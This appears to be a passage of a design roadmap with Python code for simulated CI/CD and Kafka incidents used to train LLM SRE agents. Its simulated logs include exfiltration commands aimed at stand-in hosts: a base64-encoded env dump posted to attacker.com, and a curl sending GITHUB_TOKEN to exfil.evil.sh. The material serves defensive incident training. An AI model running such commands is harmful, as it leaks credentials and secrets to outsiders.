# CI/CD + Kafka SRE Training Environment — Regenerated Roadmap
## LLM-Training Ready · Live Judge · No Hardcoding

> **Scope:** Two domains — CI/CD pipelines and Apache Kafka.  
> Every task maps to a real 2025–2026 production incident.  
> Architecture mirrors [kube-sre-gym/judge.py](https://github.com/sid-rp/kube-sre-gym/blob/main/server/judge.py):  
> live LLM judge, phase-aware scoring, no hardcoded responses.

---

## What Changed vs. Original Roadmap

| Original | Regenerated |
|---|---|
| "Master prompts" to paste into ChatGPT | Actual file specs with class interfaces |
| Hardcoded if/else log outputs | `fault_type` → live state machine, randomized realistic output |
| Single static `LLMJudge` rubric string | Multi-persona judge (junior/senior/principal) + phase detection |
| Reward function with magic floats | Evidence-tracking dataclass + domain-dispatched scorer |
| No integration with existing env | Explicit hooks into `base_env.py` and `server/app.py` |

---

## Repo Structure

```
incident-response-env/
├── simulators/
│   ├── cicd_simulator.py        # GitHub Actions / GitLab CI state machine
│   └── kafka_simulator.py       # Kafka cluster state machine
├── tasks/
│   ├── cicd_tasks.json          # 10 CI/CD incident scenarios
│   └── kafka_tasks.json         # 10 Kafka incident scenarios
├── actions/
│   ├── cicd_actions.py          # 10 SRE action handlers (CI/CD)
│   └── kafka_actions.py         # 12 SRE action handlers (Kafka)
├── environment.py               # IncidentEnv wrapping both domains
├── reward.py                    # Domain-dispatched reward with EvidenceTracker
├── judge/
│   ├── llm_client.py            # LLMClient (Anthropic + OpenAI, retry logic)
│   └── llm_judge.py             # LLMJudge + AdversarialJudge (phase-aware)
└── training/
    ├── expert_agent.py
    └── generate_data.py
```

---

## Phase 1 — CI/CD Simulator

### File: `simulators/cicd_simulator.py`

**Design principle:** No hardcoded `if fault_type == "supply_chain": return "..."`.  
Instead, each fault injects into mutable state dataclasses. Actions read live state.

```python
"""
simulators/cicd_simulator.py

CI/CD pipeline state machine for SRE incident training.
Models GitHub Actions / GitLab CI incidents from 2025–2026.

Fault injection: generate_incident_state() mutates dataclass state.
All action methods derive their output from live state — no hardcoded strings.
"""

from __future__ import annotations
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Literal

# ── Dataclasses ──────────────────────────────────────────────────────────────

@dataclass
class PipelineState:
    name: str
    status: Literal["queued","running","failed","success","stuck","never_triggered"]
    last_run_at: str
    duration_seconds: int
    queue_depth: int
    job_pickup_latency_seconds: int
    failing_step: str | None
    exit_code: int | None
    log_tail: list[str]         # list of log lines, appended by fault injection
    triggered_by: str
    branch: str
    commit_sha: str

@dataclass
class SecretState:
    name: str
    last_rotated_at: str
    is_expired: bool
    is_masked_in_logs: bool
    referenced_by: list[str]
    rotation_error: str | None

@dataclass
class RunnerState:
    runner_id: str
    type: Literal["github_hosted","self_hosted"]
    status: Literal["idle","busy","offline","compromised"]
    queue_depth: int
    last_heartbeat_seconds_ago: int
    labels: list[str]
    error_rate: float

@dataclass
class ActionState:
    name: str
    version: str
    pinned_to_sha: bool
    last_verified_at: str
    is_compromised: bool
    compromise_type: str | None   # "tag_overwrite" | "dependency_injection" | "maintainer_account"

@dataclass
class AuditEvent:
    timestamp: str
    event_type: str
    actor: str
    resource: str
    detail: str


# ── Log line generators (no hardcoding — log lines built from state) ─────────

def _secret_log_lines(secret: SecretState, pipeline: PipelineState) -> list[str]:
    lines = [
        f"[deploy] Loading credentials for pipeline '{pipeline.name}'",
        f"[deploy] Fetching secret '{secret.name}' from CI store...",
    ]
    if secret.rotation_error:
        lines += [
            f"[deploy] ERROR: {secret.name} not found in CI variable store",
            f"[deploy] Last rotation error: {secret.rotation_error}",
            f"[deploy] exit code 1",
        ]
    elif secret.is_expired:
        lines += [
            f"[deploy] ERROR: authentication failed with 401 Unauthorized",
            f"[deploy] Token {secret.name} expired at {secret.last_rotated_at}",
            f"[deploy] exit code 1",
        ]
    return lines

def _supply_chain_log_lines(action: ActionState) -> list[str]:
    payload = "aGVhcGR1bXAgJiBlbnYgPiAvdG1wL2V4ZmlsLnR4dDsgY3VybCAtWCBQT1NUIGh0dHBzOi8vYXR0YWNrZXIuY29tL2NvbGxlY3QgLS1kYXRhLWJpbmFyeSBAL3RtcC9leGZpbC50eHQ="
    return [
        f"[{action.name}] Running action {action.name}@{action.version}",
        f"[{action.name}] ::set-output name=changed_files::src/main.py,config.yaml",
        f"[debug] {payload}",
        f"[{action.name}] Done.",
    ]

def _runner_flood_log_lines(runner: RunnerState) -> list[str]:
    wait = runner.queue_depth * 11 + random.randint(0, 120)
    return [
        f"Waiting for a runner to pick up this job...",
        f"Queued for {wait // 60}m {wait % 60}s",
        f"Runner pool: {runner.queue_depth} jobs ahead. No idle runners.",
        f"Job pickup timeout threshold approaching.",
    ]

def _oidc_log_lines() -> list[str]:
    return [
        "[aws-actions/configure-aws-credentials] Assuming role via OIDC...",
        "Error: Not authorized to perform: sts:AssumeRoleWithWebIdentity",
        "Error details: audience claim mismatch",
        "  Got:      'sts.amazonaws.com'",
        "  Expected: 'api.github.com'",
        "  Check your IAM role trust policy audience condition.",
        "exit code 1",
    ]

def _workflow_injection_log_lines() -> list[str]:
    return [
        "[checkout] Fetching PR metadata...",
        "[build] Running: echo 'Building branch feature/test'",
        "[build] Running injected command from PR title:",
        '[build] $ curl https://exfil.evil.sh/collect?t=$GITHUB_TOKEN',
        "[build] Response: 200 OK",
        "[build] exit code 0",
    ]


# ── CICDSimulator ────────────────────────────────────────────────────────────

class CICDSimulator:
    """
    GitHub Actions / GitLab CI state machine.

    Usage:
        sim = CICDSimulator()
        sim.generate_incident_state(task)   # called by env.reset()
        obs = sim.read_job_logs("deploy-prod")
    """

    def __init__(self):
        self.pipelines: dict[str, PipelineState] = {}
        self.secrets: dict[str, SecretState] = {}
        self.runners: dict[str, RunnerState] = {}
        self.actions_registry: dict[str, ActionState] = {}
        self.audit_log: list[AuditEvent] = []
        self._task: dict = {}

    # ── Fault injection ──────────────────────────────────────────────────────

    def generate_incident_state(self, task: dict) -> None:
        """
        Configure simulator state to match task's fault scenario.
        Called by environment.reset(). Everything downstream reads from this state.
        """
        self._task = task
        fault = task.get("fault_type", "")
        now = datetime.now(timezone.utc)

        # Default healthy baseline
        self._seed_healthy_baseline(now)

        # Apply fault-specific mutations
        injectors = {
            "secret_rotation_break":  self._inject_secret_rotation_break,
            "runner_queue_flood":      self._inject_runner_queue_flood,
            "supply_chain":            self._inject_supply_chain,
            "workflow_injection":      self._inject_workflow_injection,
            "oidc_token_failure":      self._inject_oidc_token_failure,
            "canary_gate_stuck":       self._inject_canary_gate_stuck,
            "runner_compromise":       self._inject_runner_compromise,
            "flaky_test_regression":   self._inject_flaky_test_regression,
            "dependency_version_lock": self._inject_dependency_version_lock,
            "artifact_cache_poison":   self._inject_artifact_cache_poison,
        }
        injectors.get(fault, lambda n: None)(now)

    def _seed_healthy_baseline(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        self.pipelines = {
            "deploy-prod": PipelineState("deploy-prod","success",ts(3600),
                180,0,12,None,0,["[deploy] All steps passed."],
                "push","main","abc1234"),
            "deploy-staging": PipelineState("deploy-staging","success",ts(1800),
                120,0,8,None,0,["[staging] Deploy successful."],
                "push","main","abc1234"),
            "test-suite": PipelineState("test-suite","success",ts(900),
                240,0,9,None,0,["[test] All 847 tests passed."],
                "push","main","abc1234"),
        }
        self.secrets = {
            "AWS_DEPLOY_KEY": SecretState("AWS_DEPLOY_KEY",ts(86400*30),
                False,True,["deploy-prod","deploy-staging"],None),
            "GITHUB_TOKEN": SecretState("GITHUB_TOKEN",ts(86400*7),
                False,True,["test-suite","deploy-prod"],None),
            "DOCKER_HUB_TOKEN": SecretState("DOCKER_HUB_TOKEN",ts(86400*14),
                False,True,["deploy-prod"],None),
        }
        self.runners = {
            "gha-runner-01": RunnerState("gha-runner-01","github_hosted","idle",0,5,["ubuntu-latest"],0.0),
            "build-prod-01": RunnerState("build-prod-01","self_hosted","idle",0,3,["self-hosted","prod"],0.0),
            "build-prod-02": RunnerState("build-prod-02","self_hosted","idle",0,4,["self-hosted","prod"],0.0),
            "build-prod-03": RunnerState("build-prod-03","self_hosted","idle",0,2,["self-hosted","prod"],0.0),
        }
        self.actions_registry = {
            "actions/checkout@v4": ActionState("actions/checkout","v4",True,ts(86400)[:10],False,None),
            "file-changed-checker@v3": ActionState("file-changed-checker","v3",False,ts(86400*5)[:10],False,None),
            "deploy-service@latest": ActionState("deploy-service","latest",False,ts(86400*2)[:10],False,None),
        }
        self.audit_log = [
            AuditEvent(ts(7200),"workflow_run","ci-bot","deploy-prod","Workflow run triggered by push to main"),
            AuditEvent(ts(3900),"workflow_run","ci-bot","test-suite","Test suite completed successfully"),
        ]

    def _inject_secret_rotation_break(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        # Rotate at midnight, sync fails
        self.secrets["AWS_DEPLOY_KEY"].last_rotated_at = ts(3600)
        self.secrets["AWS_DEPLOY_KEY"].is_expired = False  # key rotated but not synced
        self.secrets["AWS_DEPLOY_KEY"].rotation_error = "CI store sync failed: Vault → GitHub Actions sync timeout"
        for name in ["deploy-prod", "deploy-staging"]:
            p = self.pipelines[name]
            p.status = "failed"
            p.last_run_at = ts(3600)
            p.failing_step = "deploy"
            p.exit_code = 1
            p.log_tail = _secret_log_lines(self.secrets["AWS_DEPLOY_KEY"], p)
        self.audit_log.append(AuditEvent(ts(3660),"secret_rotation","vault-bot","AWS_DEPLOY_KEY",
            "Secret rotated in Vault. CI store sync failed with timeout after 30s."))

    def _inject_runner_queue_flood(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        for rid, r in self.runners.items():
            r.status = "busy"
            r.queue_depth = random.randint(180, 250)
            r.last_heartbeat_seconds_ago = random.randint(10, 40)
        total_q = sum(r.queue_depth for r in self.runners.values())
        for name, p in self.pipelines.items():
            p.status = "queued"
            p.queue_depth = total_q
            p.job_pickup_latency_seconds = 940
            p.log_tail = _runner_flood_log_lines(list(self.runners.values())[0])

    def _inject_supply_chain(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        action = self.actions_registry["file-changed-checker@v3"]
        action.is_compromised = True
        action.compromise_type = "tag_overwrite"
        action.pinned_to_sha = False
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "changed-files"
        p.exit_code = 0  # it exits 0 — that's what makes it subtle
        p.log_tail = _supply_chain_log_lines(action)
        self.audit_log.append(AuditEvent(ts(14400),"tag_overwrite","unknown-actor",
            "file-changed-checker@v3","Tag v3 SHA overwritten from 3fa1c2d to 9b8e4ff by external actor"))
        self.audit_log.append(AuditEvent(ts(7200),"secret_accessed","gha-runner-01",
            "GITHUB_TOKEN","GITHUB_TOKEN read by runner during compromised action step"))

    def _inject_workflow_injection(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "build"
        p.exit_code = 0
        p.triggered_by = "pr"
        p.branch = "feature/pr-1042"
        p.log_tail = _workflow_injection_log_lines()
        self.audit_log.append(AuditEvent(ts(1800),"pr_opened","external-contributor-99",
            "PR #1042","PR opened from fork. Title contains shell metacharacters."))

    def _inject_oidc_token_failure(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "failed"
        p.failing_step = "configure-aws-credentials"
        p.exit_code = 1
        p.log_tail = _oidc_log_lines()
        self.audit_log.append(AuditEvent(ts(86400),"iam_policy_update","infra-bot",
            "arn:aws:iam::123456789:role/GHADeployRole",
            "Trust policy updated: audience condition changed to 'api.github.com'"))

    def _inject_canary_gate_stuck(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "stuck"
        p.failing_step = "canary-approval-gate"
        p.exit_code = None
        p.last_run_at = ts(10800)
        p.log_tail = [
            "[canary] Canary deployment succeeded. Metrics within thresholds.",
            "[canary] Waiting for required approval from: @alice-sre",
            "[canary] Status: PENDING_APPROVAL (10800s elapsed, no timeout configured)",
        ]
        self.audit_log.append(AuditEvent(ts(14400),"account_deactivated","it-admin",
            "alice-sre","User alice-sre deactivated as part of offboarding process"))

    def _inject_runner_compromise(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        r = self.runners["build-prod-03"]
        r.status = "compromised"
        r.last_heartbeat_seconds_ago = 8
        p = self.pipelines["deploy-prod"]
        p.log_tail = [
            "[deploy] Starting deploy workflow on build-prod-03",
            "[shai-hulud] Unexpected step: shai-hulud-workflow.yml executed",
            "[exfil] env dump dispatched to external endpoint",
        ]
        for i in range(7):
            self.audit_log.append(AuditEvent(ts(3600 - i*300),"secret_accessed","build-prod-03",
                f"pipeline-secret-{i}",
                "Secret accessed by build-prod-03 outside of scheduled job window"))

    def _inject_flaky_test_regression(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["test-suite"]
        p.status = "failed"
        p.failing_step = "test_payment_integration"
        p.exit_code = 1
        p.log_tail = [
            "[test] Running test_payment_integration...",
            "[test] AssertionError: expected payment.status='captured', got 'pending'",
            "[test] Traceback at payment_service.py:247 in process_charge()",
            "[test] This is NOT a transient failure — new code path introduced in PR #4821",
        ]
        self.audit_log.append(AuditEvent(ts(3600),"pr_merged","dev-team",
            "PR #4821","Merged: Refactor payment charge flow"))

    def _inject_dependency_version_lock(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        action = self.actions_registry["deploy-service@latest"]
        action.version = "v4.0.1"
        action.is_compromised = False
        for name, p in self.pipelines.items():
            p.status = "failed"
            p.failing_step = "deploy"
            p.exit_code = 1
            p.log_tail = [
                "[deploy-service] Running deploy-service@latest (resolved: v4.0.1)",
                "[deploy-service] Error: undefined parameter 'environment_name'",
                "[deploy-service] Did you mean 'env'? Breaking change in v4.0.0.",
                "[deploy-service] exit code 1",
            ]
        self.audit_log.append(AuditEvent(ts(4800),"action_published","deploy-team",
            "deploy-service","Published deploy-service@v4.0.0 with breaking API change"))

    def _inject_artifact_cache_poison(self, now: datetime) -> None:
        ts = lambda d: (now - timedelta(seconds=d)).isoformat()
        p = self.pipelines["deploy-prod"]
        p.status = "failed"
        p.failing_step = "security-scan"
        p.exit_code = 1
        p.log_tail = [
            "[build] Restoring cache for key: node-modules-main-abc1234",
            "[build] Cache HIT — restored node_modules from feature/experiment-42 run",
            "[build] Build complete.",
            "[security-scan] ALERT: Malware signature detected in node_modules/lodash/dist/core.min.js",
            "[security-scan] Signature: Backdoor.JS.Exfil.a",
        ]
        self.audit_log.append(AuditEvent(ts(25200),"cache_write","gha-runner-01",
            "node-modules-main","Cache key node-modules-main written by feature/experiment-42 run"))

    # ── Investigation actions (read from live state) ─────────────────────────

    def check_pipeline_status(self, pipeline_name: str) -> dict:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return {"error": f"Pipeline '{pipeline_name}' not found",
                    "available": list(self.pipelines)}
        return p.__dict__

    def read_job_logs(self, pipeline_name: str, job_name: str | None = None) -> str:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return f"Pipeline '{pipeline_name}' not found."
        logs = p.log_tail or ["[No log output available for this pipeline]"]
        header = f"=== {pipeline_name} | step: {p.failing_step or 'N/A'} | exit: {p.exit_code} ==="
        return "\n".join([header] + logs)

    def inspect_secret(self, secret_name: str) -> dict:
        s = self.secrets.get(secret_name)
        if not s:
            return {"error": f"Secret '{secret_name}' not found",
                    "available": list(self.secrets)}
        # Never return the actual value — only metadata
        return {k: v for k, v in s.__dict__.items() if k != "_value"}

    def check_runner_status(self, runner_id: str | None = None) -> dict:
        if runner_id:
            r = self.runners.get(runner_id)
            return r.__dict__ if r else {"error": f"Runner '{runner_id}' not found"}
        summary = {
            "queue_depth_total": sum(r.queue_depth for r in self.runners.values()),
            "runners": {rid: r.__dict__ for rid, r in self.runners.items()},
        }
        return summary

    def check_action_integrity(self, action_name: str, version: str) -> dict:
        key = f"{action_name}@{version}"
        a = self.actions_registry.get(key)
        if not a:
            return {"error": f"Action '{key}' not found in registry"}
        result = a.__dict__.copy()
        if a.is_compromised:
            result["evidence"] = {
                "sha_mismatch": True,
                "expected_sha": "3fa1c2d7",
                "actual_sha": "9b8e4ff2",
                "unusual_permissions": ["read:secrets","write:env"],
                "network_calls_in_action_code": ["https://api.github.com","https://exfil.evil.sh"],
            }
        return result

    def read_audit_log(self, hours_back: int = 24, filter_type: str | None = None) -> list[dict]:
        cutoff = datetime.now(timezone.utc) - timedelta(hours=hours_back)
        events = [e.__dict__ for e in self.audit_log
                  if e.timestamp > cutoff.isoformat()]
        if filter_type:
            events = [e for e in events if e["event_type"] == filter_type]
        return sorted(events, key=lambda e: e["timestamp"], reverse=True)

    # ── Remediation actions ───────────────────────────────────────────────────

    def rollback_workflow(self, pipeline_name: str, to_commit_sha: str) -> dict:
        p = self.pipelines.get(pipeline_name)
        if not p:
            return {"success": False, "message": f"Pipeline '{pipeline_name}' not found"}
        p.commit_sha = to_commit_sha
        p.status = "queued"
        p.failing_step = None
        p.exit_code = None
        return {"success": True, "message": f"Workflow queued at {to_commit_sha}", "new_status": "queued"}

    def rotate_secret(self, secret_name: str) -> dict:
        s = self.secrets.get(secret_name)
        if not s:
            return {"success": False, "propagated_to": [], "failed_services": []}
        s.last_rotated_at = datetime.now(timezone.utc).isoformat()
        s.rotation_error = None
        s.is_expired = False
        # Re-trigger pipelines that depend on this secret
        for pname in s.referenced_by:
            if pname in self.pipelines:
                self.pipelines[pname].status = "queued"
        return {"success": True, "propagated_to": s.referenced_by, "failed_services": []}

    def pin_action_to_sha(self, action_name: str, sha: str) -> dict:
        matched = [k for k in self.actions_registry if k.startswith(action_name)]
        for key in matched:
            self.actions_registry[key].pinned_to_sha = True
            self.actions_registry[key].version = sha[:7]
        return {"success": bool(matched), "pinned_sha": sha, "affected_workflows": matched}

    def isolate_runner(self, runner_id: str) -> dict:
        r = self.runners.get(runner_id)
        if not r:
            return {"success": False, "message": "Runner not found"}
        r.status = "offline"
        evidence = [e.__dict__ for e in self.audit_log
                    if r.runner_id in e.get("actor","") or r.runner_id in e.get("resource","")]
        return {"success": True, "runner_id": runner_id, "quarantined": True, "evidence": evidence}
```

---

## Phase 2 — Kafka Simulator

### File: `simulators/kafka_simulator.py`

**Key design principle:** `get_cluster_metrics()` returns aggregate totals that look healthy even when a partition is stuck. Only `check_consumer_lag(per_partition=True)` → `inspect_partition()` reveals the truth. This is the core training signal.

```python
"""
simulators/kafka_simulator.py

Kafka cluster state machine for SRE incident training.
Models incidents documented by PagerDuty (Aug 2025), Factor House (Feb 2026),
ING, Confluent, and Lenses.io.

Observability traps are first-class: aggregate metrics intentionally look healthy
for zombie consumer, poison pill, and silent lag scenarios.
"""

from __future__ import annotations
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Literal

# ── Dataclasses ──────────────────────────────────────────────────────────────

@dataclass
class PartitionState:
    partition_id: int
    leader_broker: int
    isr_replicas: list[int]
    leo: int                          # log end offset
    hw: int                           # high watermark
    consumer_offsets: dict[str, int]  # group_id → committed offset
    lag: dict[str, int]               # group_id → lag
    stuck_at_offset: int | None = None
    stuck_message_schema_error: str | None = None

@dataclass
class TopicState:
    name: str
    partition_count: int
    replication_factor: int
    partitions: dict[int, PartitionState]
    message_rate_per_sec: int
    retention_ms: int
    cleanup_policy: str

@dataclass
class ConsumerMemberState:
    member_id: str
    client_id: str
    host: str
    assigned_partitions: dict[str, list[int]]
    last_heartbeat_seconds_ago: int
    is_processing: bool
    crash_count_last_hour: int

@dataclass
class ConsumerGroupState:
    group_id: str
    status: Literal["stable","rebalancing","dead","empty"]
    members: list[ConsumerMemberState]
    total_lag: int
    last_commit_seconds_ago: int
    committed_offsets: dict[str, dict[int, int]]

@dataclass
class BrokerState:
    broker_id: int
    status: Literal["leader","follower","offline","recovering"]
    heap_used_mb: int
    heap_max_mb: int
    gc_pause_ms: int
    isr_count: int
    log_segment_size_gb: float
    network_threads_active: int
    network_threads_max: int
    log_lines: list[str]             # recent broker.log lines

@dataclass
class SchemaRegistryState:
    status: Literal["healthy","degraded","unreachable"]
    schema_versions: dict[str, int]
    compatibility_mode: str
    recent_failures: list[str]
    deleted_schemas: list[str] = field(default_factory=list)

@dataclass
class ClusterConfig:
    kafka_version: str
    kraft_mode: bool
    zookeeper_status: str | None
    topic_count: int = 0


# ── KafkaSimulator ────────────────────────────────────────────────────────────

class KafkaSimulator:
    """
    Kafka cluster state machine.

    Observability traps are by design:
    - get_cluster_metrics() total_consumer_lag is an AVERAGE — hides stuck partitions
    - check_consumer_lag() without per_partition=True masks stuck partitions
    - Broker health check returns 200 even while OOM-killing
    """

    def __init__(self):
        self.brokers: dict[int, BrokerState] = {}
        self.topics: dict[str, TopicState] = {}
        self.consumer_groups: dict[str, ConsumerGroupState] = {}
        self.schema_registry = SchemaRegistryState("healthy",{},
            "BACKWARD",[])
        self.cluster_config = ClusterConfig("3.7.0", True, None)
        self._task: dict = {}

    # ── Fault injection ───────────────────────────────────────────────────────

    def generate_incident_state(self, task: dict) -> None:
        self._task = task
        fault = task.get("fault_type","")
        self._seed_healthy_baseline()
        injectors = {
            "poison_pill":          self._inject_poison_pill,
            "zombie_consumer":      self._inject_zombie_consumer,
            "broker_oom_cascade":   self._inject_broker_oom,
            "isr_churn":            self._inject_isr_churn,
            "rebalance_storm":      self._inject_rebalance_storm,
            "schema_desync":        self._inject_schema_desync,
            "retry_amplification":  self._inject_retry_amplification,
            "silent_lag":           self._inject_silent_lag,
            "topic_sprawl":         self._inject_topic_sprawl,
            "producer_epoch":       self._inject_producer_epoch,
        }
        injectors.get(fault, lambda: None)()

    def _seed_healthy_baseline(self) -> None:
        for bid in [0, 1, 2]:
            self.brokers[bid] = BrokerState(
                bid, "leader" if bid == 0 else "follower",
                heap_used_mb=2048, heap_max_mb=8192,
                gc_pause_ms=45, isr_count=3,
                log_segment_size_gb=1.2,
                network_threads_active=8, network_threads_max=16,
                log_lines=["[INFO] Partition leader elected for orders-0",
                           "[INFO] Log compaction completed for payments",
                           "[INFO] Replica fetch latency p99=12ms"]
            )
        for topic_name, partitions in [("orders", 8), ("payments", 4),
                                        ("inventory-events", 6), ("checkout-events", 4),
                                        ("email-dispatch", 8)]:
            parts = {}
            for pid in range(partitions):
                leo = random.randint(9_000_000, 10_000_000)
                coff = leo - random.randint(5, 50)
                parts[pid] = PartitionState(pid, pid % 3, [0,1,2],
                    leo, leo - 2,
                    {"order-fulfillment": coff, "email-dispatch": coff - 10},
                    {"order-fulfillment": leo - coff, "email-dispatch": 10})
            self.topics[topic_name] = TopicState(topic_name, partitions, 3,
                parts, 1200, 604_800_000, "delete")
        self.consumer_groups = {
            "order-fulfillment": ConsumerGroupState(
                "order-fulfillment","stable",
                [ConsumerMemberState(f"consumer-{i}","order-svc",f"10.0.0.{10+i}",
                    {"orders": [i*2, i*2+1]},3,True,0) for i in range(4)],
                total_lag=40, last_commit_seconds_ago=2,
                committed_offsets={}),
            "email-dispatch": ConsumerGroupState(
                "email-dispatch","stable",
                [ConsumerMemberState(f"email-{i}","email-svc",f"10.0.1.{10+i}",
                    {"email-dispatch": list(range(i*2, i*2+2))},4,True,0) for i in range(4)],
                total_lag=80, last_commit_seconds_ago=3,
                committed_offsets={}),
        }
        self.schema_registry = SchemaRegistryState(
            "healthy",{"orders-value":8,"payments-value":5,"inventory-events-value":7},
            "BACKWARD",[])
        self.cluster_config = ClusterConfig("3.7.0",True,None,topic_count=47)

    def _inject_poison_pill(self) -> None:
        stuck_offset = 8_847_293
        topic = self.topics["orders"]
        # Partitions 0,1,3..7 look fine; partition 2 is stuck
        for pid, part in topic.partitions.items():
            if pid == 2:
                part.stuck_at_offset = stuck_offset
                part.stuck_message_schema_error = (
                    "Avro deserialization failed: unknown magic byte 0x7b (expected 0x00). "
                    "Producer sent JSON but schema registry expects Avro.")
                part.consumer_offsets["order-fulfillment"] = stuck_offset
                part.lag["order-fulfillment"] = part.leo - stuck_offset
            else:
                part.lag["order-fulfillment"] = random.randint(5, 50)
        group = self.consumer_groups["order-fulfillment"]
        group.total_lag = sum(p.lag.get("order-fulfillment",0)
                              for p in topic.partitions.values())
        # Members heartbeating but member assigned to partition 2 is looping
        for m in group.members:
            if 2 in m.assigned_partitions.get("orders",[]):
                m.crash_count_last_hour = 47
                m.is_processing = False

    def _inject_zombie_consumer(self) -> None:
        group = self.consumer_groups["order-fulfillment"]
        group.total_lag = 2_100_000
        group.last_commit_seconds_ago = 7200
        for m in group.members:
            m.is_processing = False
            m.last_heartbeat_seconds_ago = 5   # heartbeat sends, but no commits

    def _inject_broker_oom(self) -> None:
        b = self.brokers[0]
        b.heap_used_mb = b.heap_max_mb - 128
        b.gc_pause_ms = 2800
        b.status = "offline"
        b.log_lines = [
            "[WARN] GC overhead limit exceeded. Heap at 98%.",
            "[ERROR] java.lang.OutOfMemoryError: Java heap space",
            "[ERROR] Broker 0 shutting down due to unrecoverable error.",
            "[INFO] Leadership moving to broker 1 for all partitions.",
        ]
        # 12 underreplicated partitions
        for topic in list(self.topics.values())[:3]:
            for pid in list(topic.partitions.keys())[:4]:
                topic.partitions[pid].isr_replicas = [1, 2]  # broker 0 gone

    def _inject_isr_churn(self) -> None:
        b = self.brokers[2]
        b.status = "recovering"
        b.log_lines = [
            "[INFO] Broker 2 restarted, beginning log recovery.",
            "[INFO] Replica fetch lag: 12,847,291 messages behind leader.",
            "[INFO] ISR shrink: partition orders-5 ISR=[0,1] (broker 2 removed).",
            "[INFO] Estimated time to rejoin ISR: 18 minutes at current fetch rate.",
        ]
        for topic in self.topics.values():
            for pid, part in topic.partitions.items():
                part.isr_replicas = [0, 1]
                part.hw = part.leo - 500

    def _inject_rebalance_storm(self) -> None:
        group = self.consumer_groups["order-fulfillment"]
        group.status = "rebalancing"
        group.total_lag = 0  # no processing happening
        group.last_commit_seconds_ago = 30
        for m in group.members:
            m.last_heartbeat_seconds_ago = random.randint(1, 3)
            m.is_processing = False
            m.crash_count_last_hour = 0

    def _inject_schema_desync(self) -> None:
        self.schema_registry.recent_failures.append(
            "Schema ID 6 not found for subject 'inventory-events-value'. "
            "Producer at 10.0.2.44 using deleted schema version.")
        self.schema_registry.deleted_schemas.append("inventory-events-value:v6")
        group = self.consumer_groups.get("email-dispatch")
        if group:
            group.total_lag = 450_000
            group.last_commit_seconds_ago = 3600

    def _inject_retry_amplification(self) -> None:
        b = self.brokers[0]
        b.network_threads_active = b.network_threads_max
        b.log_lines = [
            "[WARN] Request handler thread pool exhausted.",
            "[WARN] Dropping incoming connections: queue full (847 pending).",
            "[ERROR] ProduceRequest timeout for topic 'orders' partition 0.",
            "[ERROR] Network thread saturation — retry storm in progress.",
        ]

    def _inject_silent_lag(self) -> None:
        """The 'context gap' from Factor House Feb 2026."""
        group = self.consumer_groups["email-dispatch"]
        topic = self.topics["email-dispatch"]
        # Partition 4 stuck; others fine
        for pid, part in topic.partitions.items():
            if pid == 4:
                part.stuck_at_offset = 2_847_291
                part.consumer_offsets["email-dispatch"] = 2_847_291
                part.lag["email-dispatch"] = 2_100_000
            else:
                part.lag["email-dispatch"] = random.randint(50, 400)
        # Average lag looks fine: (2_100_000 + 7*200) / 8 ≈ 262_675
        # But that's still a high average — set up to be masked
        group.total_lag = sum(p.lag.get("email-dispatch",0)
                              for p in topic.partitions.values())

    def _inject_topic_sprawl(self) -> None:
        self.cluster_config.topic_count = 12_047
        for b in self.brokers.values():
            b.log_lines = [
                "[WARN] Metadata load time: 847s on last broker restart.",
                "[WARN] ZooKeeper session expiry during metadata sync.",
                "[INFO] Consumer group join timeout: metadata not yet loaded.",
            ]

    def _inject_producer_epoch(self) -> None:
        topic = self.topics["payments"]
        for pid, part in list(topic.partitions.items())[:2]:
            # Duplicate sequence numbers at these offsets
            part.stuck_at_offset = None
            part.stuck_message_schema_error = (
                "Producer epoch reset detected at offset 4_821_000. "
                "Idempotency guard bypassed: duplicate transaction_id entries present.")
        self.brokers[0].log_lines = [
            "[INFO] Producer epoch reset for client payment-service-prod-1.",
            "[WARN] Sequence number conflict: epoch 0 reused. Accepting as new producer.",
            "[WARN] Idempotency violation window: 14:47:23 → 14:51:07 UTC.",
        ]

    # ── Investigation actions ─────────────────────────────────────────────────

    def get_cluster_metrics(self) -> dict:
        online = sum(1 for b in self.brokers.values() if b.status != "offline")
        underreplicated = sum(
            1 for t in self.topics.values()
            for p in t.partitions.values()
            if len(p.isr_replicas) < t.replication_factor
        )
        all_lags = [
            lag for g in self.consumer_groups.values()
            for t_lags in [g.committed_offsets] for _ in [None]
        ]
        # Return AVERAGE lag — this is the observability trap
        total_lag = sum(g.total_lag for g in self.consumer_groups.values())
        group_count = len(self.consumer_groups) or 1
        return {
            "broker_count": len(self.brokers),
            "online_brokers": online,
            "underreplicated_partitions": underreplicated,
            "total_consumer_lag": total_lag,
            "avg_lag_per_group": total_lag // group_count,  # ← intentionally misleading aggregate
            "topic_count": self.cluster_config.topic_count,
            "kafka_version": self.cluster_config.kafka_version,
            "note": "Aggregate lag may hide per-partition skew. Use check_consumer_lag() for detail.",
        }

    def check_consumer_lag(self, group_id: str | None = None,
                           topic: str | None = None) -> dict:
        if group_id:
            g = self.consumer_groups.get(group_id)
            if not g:
                return {"error": f"Group '{group_id}' not found"}
            t = self.topics.get(topic) if topic else None
            result = {"group_id": group_id, "status": g.status,
                      "total_lag": g.total_lag,
                      "last_commit_seconds_ago": g.last_commit_seconds_ago}
            if t:
                result["per_partition_lag"] = {
                    pid: part.lag.get(group_id, 0)
                    for pid, part in t.partitions.items()
